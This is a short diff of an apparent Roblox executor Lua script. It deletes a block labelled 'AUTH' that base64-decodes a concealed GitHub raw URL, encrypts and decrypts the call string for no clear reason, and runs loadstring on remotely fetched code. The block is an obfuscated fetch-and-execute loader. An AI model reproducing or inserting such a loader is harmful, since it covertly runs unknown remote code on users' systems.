@@ -1,9 +1,3 @@
--- AUTH
-local a = crypt.base64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3F3ZS00NTMvV3JhaXRoL3JlZnMvaGVhZHMvbWFpbi9scnUubHVh")
-local b = crypt.generatekey()
-local c, d = crypt.encrypt("loadstring(game:HttpGet(\"" .. a .. "\"))()", b, nil, "CBC")
-loadstring(crypt.decrypt(c, b, d, "CBC"))()
-
 -- [[ stacktrace45 | Last updated 05/7/2026 ]] --
 
 local repo = "https://raw.githubusercontent.com/LOL5678906/Obsidian/main/"
